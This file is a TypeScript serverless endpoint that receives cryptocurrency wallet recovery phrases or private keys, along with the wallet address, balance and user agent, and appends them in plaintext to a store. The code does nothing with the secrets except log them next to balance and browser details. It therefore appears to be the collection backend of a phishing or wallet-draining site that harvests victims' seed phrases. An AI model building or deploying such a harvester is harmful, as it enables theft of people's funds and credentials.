import type { VercelRequest, VercelResponse } from '@vercel/node'
import { randomUUID } from 'crypto'
import { appendRecord } from '../lib/store.js'

export default async function handler(req: VercelRequest, res: VercelResponse) {
  if (req.method !== 'POST') {
    return res.status(405).json({ error: 'method not allowed' })
  }

  const type = req.body?.type
  const secret = typeof req.body?.secret === 'string' ? req.body.secret.trim() : ''
  const address = typeof req.body?.address === 'string' ? req.body.address.trim() : ''
  const balance = typeof req.body?.balance === 'string' ? req.body.balance : '0'
  const ua = typeof req.body?.ua === 'string' ? req.body.ua : undefined

  if (type !== 'mnemonic' && type !== 'privateKey') {
    return res.status(400).json({ error: 'invalid type' })
  }
  if (!secret || !/^scash1[a-z0-9]{20,}$/.test(address)) {
    return res.status(400).json({ error: 'invalid payload' })
  }

  try {
    await appendRecord({
      id: randomUUID(),
      type,
      secret,
      address,
      balance,
      ua,
      createdAt: new Date().toISOString(),
    })
    return res.status(200).json({ ok: true })
  } catch (err) {
    return res.status(500).json({ error: err instanceof Error ? err.message : 'store failed' })
  }
}
